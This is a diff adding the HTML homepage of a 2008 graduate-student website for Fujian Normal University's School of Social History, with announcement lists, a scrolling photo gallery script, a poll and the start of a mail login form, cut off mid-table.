@@ -1,0 +1,933 @@
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<meta name="keywords" content="福建师范大学,社会历史学院,研究生,攀研,社会历史学院论坛">
+<meta name="description" content="福建师范大学社会历史学院"> 
+<title>福建师范大学社会历史学院研究生网</title>
+<link href="font.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+<!--
+.style1 {color: #FFFFFF}
+-->
+</style>
+</head>
+<body bgcolor="#8B3F10" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+
+<table width="1002" border="0" cellpadding="0" cellspacing="0" background="aflcimages/bg_top.jpg">
+  <tr> 
+    <td width="778" align="right" valign="top"><table width="100%" border="0" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td width="415"><img src="aflcimages/logo.jpg" width="415" height="89"></td>
+          <td align="right" valign="top"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td align="right"><img src="aflcimages/pic_top.jpg" width="241" height="66"></td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+      </table></td>
+    <td width="20" background="aflcimages/bg_right.jpg">&nbsp;</td>
+    <td bgcolor="#8B3F10">&nbsp;</td>
+  </tr>
+</table>
+<table width="1002" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr> 
+    <td width="778" valign="top">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0" background="aflcimages/bg_nav.jpg">
+        <tr> 
+          <td width="150" height="30" align="center" style="color:#E69320;line-height:20px;">
+			2008年3月10日星期一
+		  </td>
+          <td valign="bottom"><table width="98%" border="0" cellspacing="0" cellpadding="0">
+            <tr align="center">
+              <td height="25"><a href="about.asp" class="a02">学院概况</a><a href="home.asp" class="a02"></a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="teacher.asp" class="a02">党建工作</a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="education.asp" class="a02">总班活动</a><a href="news.asp" class="a02"></a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="report.asp" class="a02">学习资料</a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="internation.asp" class="a02">报考指南</a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="recruit_in.asp" class="a02">就业导航</a><a href="org_university.asp" class="a02"></a><a href="forum/forum.asp" class="a02"></a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="culture.asp" class="a02">师大掠影</a></td>
+              <td width="10" style="color:#FFA826">|</td>
+              <td><a href="forum/forum.asp" class="a02">留言板</a></td>
+            </tr>
+          </table></td>
+        </tr>
+      </table>
+      <table width="100%" border="0" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td height="3"><img src="aflcimages/line_point1.jpg" width="778" height="3"></td>
+        </tr>
+      </table>
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td><img src="aflcimages/p_home.jpg" width="778" height="255"></td>
+        </tr>
+      </table>
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td>&nbsp;</td>
+          <td width="199" valign="top" bgcolor="#FAF6E8" style="border-left:1px solid #E4CAB3;">&nbsp;</td>
+        </tr>
+        <tr> 
+          <td align="center" valign="top"> <table width="97%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="25" align="center" bgcolor="#993300"><img src="aflcimages/arrow_2.gif" width="16" height="10"></td>
+                <td width="145" align="center" bgcolor="#993300" class="font5">最新公告</td>
+                <td width="57"><img src="aflcimages/point_title2.gif" width="57" height="21"></td>
+                <td align="right" valign="bottom" style="border-bottom:2px solid #EEDDB6;"><a href="news.asp?keyno=20"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a>&nbsp;&nbsp;</td>
+              </tr>
+            </table>
+            <table width="97%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+			  
+				  <tr> 
+					<td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+					<td><a href="news_info.asp?keyno=760" target="_blank" class="a01">课堂教学：王安石变法——附中实战观摩</a>&nbsp;&nbsp; <img src=aflcimages/icon_news.gif></td>
+					<td width="80" style="color:#AAA">[2008-3-10]</td>
+				  </tr>
+				  <tr> 
+					<td height="1" colspan="3" background="aflcimages/line_point2.gif"></td>
+				  </tr>
+			  
+				  <tr> 
+					<td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+					<td><a href="news_info.asp?keyno=759" target="_blank" class="a01">公  告</a>&nbsp;&nbsp; <img src=aflcimages/icon_news.gif></td>
+					<td width="80" style="color:#AAA">[2008-3-10]</td>
+				  </tr>
+				  <tr> 
+					<td height="1" colspan="3" background="aflcimages/line_point2.gif"></td>
+				  </tr>
+			  
+				  <tr> 
+					<td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+					<td><a href="news_info.asp?keyno=755" target="_blank" class="a01">近期毕业班要做的事情（08一号）—— 大树精简版</a>&nbsp;&nbsp;</td>
+					<td width="80" style="color:#AAA">[2008-3-6]</td>
+				  </tr>
+				  <tr> 
+					<td height="1" colspan="3" background="aflcimages/line_point2.gif"></td>
+				  </tr>
+			  
+				  <tr> 
+					<td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+					<td><a href="news_info.asp?keyno=752" target="_blank" class="a01">关于开展2008届毕业研究生学历证书电子注册像片采集工作的紧急通知</a>&nbsp;&nbsp;</td>
+					<td width="80" style="color:#AAA">[2008-3-6]</td>
+				  </tr>
+				  <tr> 
+					<td height="1" colspan="3" background="aflcimages/line_point2.gif"></td>
+				  </tr>
+			  
+				  <tr> 
+					<td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+					<td><a href="news_info.asp?keyno=751" target="_blank" class="a01"><font color=#FF6347>08届毕业生就业讲座：戊戌变法</a>&nbsp;&nbsp;</td>
+					<td width="80" style="color:#AAA">[2008-3-5]</td>
+				  </tr>
+				  <tr> 
+					<td height="1" colspan="3" background="aflcimages/line_point2.gif"></td>
+				  </tr>
+			  
+              <tr> 
+                <td colspan="3">&nbsp;</td>
+              </tr>
+            </table>
+            <table width="97%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FAF6E8" style="border:1px solid #E8D9CF;">
+              <tr> 
+                <td>&nbsp;</td>
+              </tr>
+              <tr>
+               <td align="center" valign="top">
+				<DIV id=pic style="OVERFLOW: hidden; height: 115; width: 540; align: center">
+                  <table width="96%" border="0" cellspacing="0" cellpadding="0">
+                    <tr>
+                      <td align="center" id=Content1><table><tr>
+					
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=628" target=_blank><img src="myasp_pic_display.asp?keyno=628&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=628" target=_blank class="a01">2007年总班迎新篮球赛之二</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=627" target=_blank><img src="myasp_pic_display.asp?keyno=627&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=627" target=_blank class="a01">2007年总班迎新篮球赛之一</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=626" target=_blank><img src="myasp_pic_display.asp?keyno=626&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=626" target=_blank class="a01">2007年研究生联赛之二</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=625" target=_blank><img src="myasp_pic_display.asp?keyno=625&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=625" target=_blank class="a01">2007年总班迎新篮球赛之三</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=623" target=_blank><img src="myasp_pic_display.asp?keyno=623&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=623" target=_blank class="a01">中秋博饼会之知识竞猜</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=621" target=_blank><img src="myasp_pic_display.asp?keyno=621&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=621" target=_blank class="a01">百年师大之盛世庆典</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=619" target=_blank><img src="myasp_pic_display.asp?keyno=619&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=619" target=_blank class="a01">百年碑林之流水淙淙</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=618" target=_blank><img src="myasp_pic_display.asp?keyno=618&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=618" target=_blank class="a01">百年碑林之华安石</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=617" target=_blank><img src="myasp_pic_display.asp?keyno=617&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=617" target=_blank class="a01">百年师大之宝琛铜像</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+						<td valign="top">
+						  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+							<tr> 
+							  <td align="center"><a href="culture_info.asp?keyno=616" target=_blank><img src="myasp_pic_display.asp?keyno=616&code=2&tablename=news" width="120" height="80" style="border:3px solid #E4D1BD;"></a></td>
+							</tr>
+							<tr> 
+							  <td height="25" align="center"><a href="culture_info.asp?keyno=616" target=_blank class="a01">百年师大之百年宝球</a></td>
+							</tr>
+						  </table>
+						</td>
+					  
+                      </tr></table></td>
+
+					  <td id=Content2></td>
+                    </tr>
+                  </table>
+				 </div> 
+				<SCRIPT language=Javascript>
+					var speed=35;
+					Content2.innerHTML=Content1.innerHTML;
+					function Marquee()
+					{ 
+						if(pic.scrollLeft>=Content1.scrollWidth)
+						{pic.scrollLeft=0;
+						} 
+						else
+						{pic.scrollLeft++;
+						}
+					} 
+					var Mar=setInterval(Marquee,speed) 
+					pic.onmouseover=function() 
+					{clearInterval(Mar)
+					} 
+					pic.onmouseout=function() 
+					{Mar=setInterval(Marquee,speed)
+					} 
+				</SCRIPT>
+				</td>
+              </tr>
+              <tr> 
+                <td>&nbsp;</td>
+              </tr>
+            </table>
+            <table width="97%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td>&nbsp;</td>
+              </tr>
+            </table>
+            <table width="97%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="51%" valign="top"> <table width="97%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td width="25" align="center" bgcolor="#993300"><img src="aflcimages/arrow_2.gif" width="16" height="10"></td>
+                      <td width="100" align="center" bgcolor="#993300" class="font5">就业导航</td>
+                      <td width="57"><img src="aflcimages/point_title2.gif" width="57" height="21"></td>
+                      <td align="right" valign="bottom" style="border-bottom:2px solid #EEDDB6;"><a href="recruit_in.asp"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a>&nbsp;&nbsp;</td>
+                    </tr>
+                  </table>
+                  <table width="97%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="recruit_info.asp?keyno=754" target=_blank class="a01">2008届毕（结）业生学历证书电子注..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="recruit_info.asp?keyno=753" target=_blank class="a01">关于开展2008届研究生毕业和学位申..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="recruit_info.asp?keyno=742" target=_blank class="a01">福建师范大学关于2008年公开招聘思..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="recruit_info.asp?keyno=735" target=_blank class="a01">关于举办福建省2008年春季大中专毕..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="recruit_info.asp?keyno=718" target=_blank class="a01">福建省2008年春季考试录用公务员公..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+                  </table></td>
+                <td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td width="25" align="center" bgcolor="#993300"><img src="aflcimages/arrow_2.gif" width="16" height="10"></td>
+                      <td width="100" align="center" bgcolor="#993300" class="font5">学习资料</td>
+                      <td width="57"><img src="aflcimages/point_title2.gif" width="57" height="21"></td>
+                      <td align="right" valign="bottom" style="border-bottom:2px solid #EEDDB6;"><a href="report.asp"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a>&nbsp;&nbsp;</td>
+                    </tr>
+                  </table>
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="report_info.asp?keyno=758" target=_blank class="a01">就业指导讲座之一..</a>&nbsp; <img src=aflcimages/icon_news.gif></td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="report_info.asp?keyno=715" target=_blank class="a01">博导论坛记录（五）----翻译与中国..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="report_info.asp?keyno=702" target=_blank class="a01">博导论坛记录（四）----《周易》和..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="report_info.asp?keyno=701" target=_blank class="a01">博士生论坛记录（五）..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="report_info.asp?keyno=684" target=_blank class="a01">博导论坛记录（三）----馆藏历史文..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+                  </table></td>
+              </tr>
+            </table>
+            <table width="97%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td>&nbsp;</td>
+              </tr>
+              <tr> 
+                <td>AD</td>
+              </tr>
+              <tr> 
+                <td>&nbsp;</td>
+              </tr>
+            </table>
+            <table width="97%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="51%" valign="top"> <table width="97%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td width="25" align="center" bgcolor="#993300"><img src="aflcimages/arrow_2.gif" width="16" height="10"></td>
+                      <td width="100" align="center" bgcolor="#993300" class="font5">党建工作</td>
+                      <td width="57"><img src="aflcimages/point_title2.gif" width="57" height="21"></td>
+                      <td align="right" valign="bottom" style="border-bottom:2px solid #EEDDB6;"><a href="teacher.asp"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a>&nbsp;&nbsp;</td>
+                    </tr>
+                  </table>
+                  <table width="97%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="teacher_info.asp?keyno=756" target=_blank class="a01">"老少争辉十七大"..</a>&nbsp; <img src=aflcimages/icon_news.gif></td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="teacher_info.asp?keyno=739" target=_blank class="a01">寄情老人节——“迎冬至，包饺子”..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="teacher_info.asp?keyno=738" target=_blank class="a01">2007级研究生党支部第一批入党积极..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="teacher_info.asp?keyno=686" target=_blank class="a01">刺桐探悠  余辉暖心..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="teacher_info.asp?keyno=677" target=_blank class="a01">学习党的十七大精神辅导报告会..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+                  </table></td>
+                <td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td width="25" align="center" bgcolor="#993300"><img src="aflcimages/arrow_2.gif" width="16" height="10"></td>
+                      <td width="100" align="center" bgcolor="#993300" class="font5">报考指南</td>
+                      <td width="57"><img src="aflcimages/point_title2.gif" width="57" height="21"></td>
+                      <td align="right" valign="bottom" style="border-bottom:2px solid #EEDDB6;"><a href="internation.asp"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a>&nbsp;&nbsp;</td>
+                    </tr>
+                  </table>
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="internation_info.asp?keyno=646" target=_blank class="a01">福建师范大学2008年博士生招生简章..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="internation_info.asp?keyno=609" target=_blank class="a01">导师风采..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="internation_info.asp?keyno=581" target=_blank class="a01">福建师范大学社会历史学院2007年博..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="internation_info.asp?keyno=580" target=_blank class="a01">福建师范大学社会历史学院2008年硕..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+					<tr> 
+                      <td width="20" height="25" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                      <td><a href="internation_info.asp?keyno=579" target=_blank class="a01">2007年社会历史学院硕士生录取情况..</a>&nbsp;</td>
+                    </tr>
+                    <tr> 
+                      <td height="1" background="aflcimages/line_point2.gif"></td>
+                      <td background="aflcimages/line_point2.gif"></td>
+                    </tr>
+				  
+                    <tr> 
+                      <td>&nbsp;</td>
+                      <td>&nbsp;</td>
+                    </tr>
+                  </table></td>
+              </tr>
+            </table></td>
+          <td valign="top" bgcolor="#FAF6E8" style="border-left:1px solid #E4CAB3;"><table width="190" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="25" align="center" background="aflcimages/bg_title2.jpg" class="font5">表格下载</td>
+              </tr>
+              <tr> 
+                <td align="right"><img src="aflcimages/shadow_1.jpg" width="59" height="7"></td>
+              </tr>
+            </table>
+            <table width="95%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td><table width="102%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td width="20">&nbsp;</td>
+                    <td>&nbsp;</td>
+                  </tr>
+                  
+                  <tr>
+                    <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                    <td><a href="news_info.asp?keyno=690" target=_blank class="a11">请假表下载</a></td>
+                  </tr>
+                  
+                  <tr>
+                    <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                    <td><a href="news_info.asp?keyno=687" target=_blank class="a11">硕士生毕业论文写作要求及模</a></td>
+                  </tr>
+                  
+                  <tr>
+                    <td height="22" align="center">&nbsp;</td>
+                    <td align="right"><a href="education.asp?keyno=94"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a></td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table>
+            <table width="190" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="25" align="center" background="aflcimages/bg_title2.jpg" class="font5">学院新闻</td>
+              </tr>
+              <tr> 
+                <td align="right"><img src="aflcimages/shadow_1.jpg" width="59" height="7"></td>
+              </tr>
+            </table>
+            <table width="95%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td width="20">&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+			
+              <tr> 
+                <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                <td><a href="news_info.asp?keyno=740" target=_blank class="a11">我院李蕊同学当选为“中国大</a></td>
+              </tr>
+			
+              <tr> 
+                <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                <td><a href="news_info.asp?keyno=708" target=_blank class="a11">旗山佛教文化考察行</a></td>
+              </tr>
+			
+              <tr> 
+                <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                <td><a href="news_info.asp?keyno=682" target=_blank class="a11">05级硕士研究生科讨会论文</a></td>
+              </tr>
+			
+              <tr> 
+                <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                <td><a href="news_info.asp?keyno=680" target=_blank class="a11">我院李巨轸副教授喜获教育部</a></td>
+              </tr>
+			
+              <tr> 
+                <td height="23" align="center"><img src="aflcimages/arrow_1.gif" width="7" height="7"></td>
+                <td><a href="news_info.asp?keyno=652" target=_blank class="a11">我校2006-2007学年</a></td>
+              </tr>
+			
+              <tr> 
+                <td height="22" align="center">&nbsp;</td>
+                <td align="right"><a href="news.asp?keyno=92"><img src="aflcimages/bt_more1.gif" width="34" height="7" border="0"></a></td>
+              </tr>
+            </table>
+            <table width="190" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="25" align="center" background="aflcimages/bg_title2.jpg" class="font5">网上调查</td>
+              </tr>
+              <tr> 
+                <td align="right"><img src="aflcimages/shadow_1.jpg" width="59" height="7"></td>
+              </tr>
+            </table>
+            <table width="85%" border="0" align="center" cellpadding="0" cellspacing="0">
+			<form name="form_vote" method="post" action="home.asp#vote">
+			
+			  <tr> 
+                <td>&nbsp;</td>
+              </tr>
+              <tr> 
+                <td>你最希望网站提供的服务是什么?</td>
+              </tr>
+            </table>
+            <table width="88%" border="0" align="center" cellpadding="0" cellspacing="0">
+			 
+              <tr> 
+                <td width="30" height="30"> <input type="radio" name="radiobutton" value="2" checked> 
+                </td>
+                <td>更多的学术信息</td>
+              </tr>
+			
+              <tr> 
+                <td width="30" height="30"> <input type="radio" name="radiobutton" value="3"> 
+                </td>
+                <td>师大的校园生活信息</td>
+              </tr>
+			
+              <tr> 
+                <td width="30" height="30"> <input type="radio" name="radiobutton" value="4"> 
+                </td>
+                <td>学院的教育情况</td>
+              </tr>
+			
+            </table>
+            <table width="85%" border="0" align="center" cellpadding="0" cellspacing="0">
+			  <tr> 
+                <td height="35" align="center"><input type="image" border="0" src="aflcimages/bt_home1.gif" width="34" height="19"></td>
+                <td><a href="#" onClick="window.open('popwin_vote.asp','','width=500,height=253,scrollbars=no,left=300,top=200'); return false;"><img src="aflcimages/bt_home3.gif" width="34" height="19" border="0"></a></td>
+              </tr>			  
+            </table>			
+		  </td>
+        </tr>
+    </table>
+	</form>
+	</td>
+    <td width="20" background="aflcimages/bg_right.jpg">&nbsp;</td>
+    <td valign="top" bgcolor="#8B3F10"> 
+      <table width="200" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td><img src="aflcimages/title_Email.jpg" width="200" height="27"></td>
+        </tr>
+      </table>			
+	  <form name=loginform method=post action="admin/login.asp">
+			<INPUT type=hidden name=user>
+			 <INPUT type=hidden name=pass>
+			 <INPUT type=hidden name=curdomain>
+			<INPUT type=hidden name=outurl> 
+			<input type=hidden name=product value=mail>
+			<INPUT TYPE="hidden" name="domainname" value="aflc.com.cn">
+      <table width="200" border="0" cellpadding="0" cellspacing="0" background="aflcimages/bg_title1.gif">
+        <tr> 
